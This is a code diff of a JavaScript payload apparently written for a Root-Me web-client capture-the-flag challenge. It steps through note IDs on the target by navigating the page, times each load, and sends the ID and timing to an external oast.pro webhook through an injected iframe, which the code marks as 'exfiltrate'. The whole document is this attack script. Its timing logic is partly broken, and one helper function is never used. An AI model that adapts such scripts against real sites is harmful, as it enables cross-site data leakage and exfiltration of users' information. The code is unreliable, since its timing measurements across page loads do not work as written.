@@ -3,30 +3,45 @@ const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 
 let i = 0;
-const MAX = 2000; // adjust if needed
+const MAX = 2000;
 
-function next() {
-    if (i > MAX) return;
-
+async function probe(id) {
     const start = performance.now();
-    const w = window.open(TARGET + i);
 
-    w.onload = () => {
-        const delta = performance.now() - start;
+    // navigate
+    location.href = TARGET + id;
 
-        console.log("ID:", i, "TIME:", delta);
-
-        // send result
-        const ex = document.createElement("iframe");
-        ex.src = WEBHOOK + "?id=" + i + "&t=" + delta;
-        ex.style.display = "none";
-        document.documentElement.appendChild(ex);
-
-        w.close();
-
-        i++;
-        setTimeout(next, 1200); // spacing to avoid overlap
-    };
+    // when page loads again, script runs again
 }
-next();
+
+// recover state
+const params = new URLSearchParams(location.search);
+const prev = params.get("p");
+const start = params.get("t");
+
+if (prev !== null && start !== null) {
+    const delta = performance.now() - parseFloat(start);
+
+    console.log("ID:", prev, "TIME:", delta);
+
+    // exfiltrate
+    const ex = document.createElement("iframe");
+    ex.src = WEBHOOK + "?id=" + prev + "&t=" + delta;
+    document.documentElement.appendChild(ex);
+
+    i = parseInt(prev) + 1;
+} else {
+    i = 0;
+}
+
+// continue loop
+if (i < MAX) {
+    const nextStart = performance.now();
+
+    location.href =
+        TARGET +
+        i +
+        "?p=" + i +
+        "&t=" + nextStart;
+}
 </script>
